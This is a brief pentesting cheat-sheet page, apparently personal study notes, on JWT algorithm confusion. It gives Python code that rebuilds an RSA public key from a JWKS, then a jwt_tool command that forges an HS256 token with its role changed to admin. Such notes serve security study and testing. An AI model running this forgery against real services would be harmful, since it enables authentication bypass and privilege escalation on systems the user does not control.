---
title: "JWT"
date: 2024-8-1
tags: ["jwt", "jwks", "forge", "cookies"]
---

### Abuse #1: Algorithm confusion

#### 0. Sample jwks.json

<div>

```console
{ 
    "keys": [
        {
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "n": "<BASE64_n>",
        "e": "AQAB"
        }
    ]
}
```

</div>

#### 1. Create a public key

<div>

```console
python3
```

```console
from base64 import urlsafe_b64decode
```

```console
from Crypto.PublicKey import RSA
```

```console
e = int.from_bytes(urlsafe_b64decode(b'AQAB'))
```

```console
n = int.from_bytes(urlsafe_b64decode(b'<BASE64_N>'))
```

```console
key = RSA.construct((n, e))
```

```console
# Save it to public.pem
print(key.exportKey().decode())
```

</div>

#### 2. Forge a jwt

<div>

```console
# For example, modify role to admin
python3 jwt_tool.py -S hs256 -k public.pem -I -pc role -pv admin <JWT>
```

</div>

<small>*Ref: [jwt_tool](https://github.com/ticarpi/jwt_tool)*</small>

<br>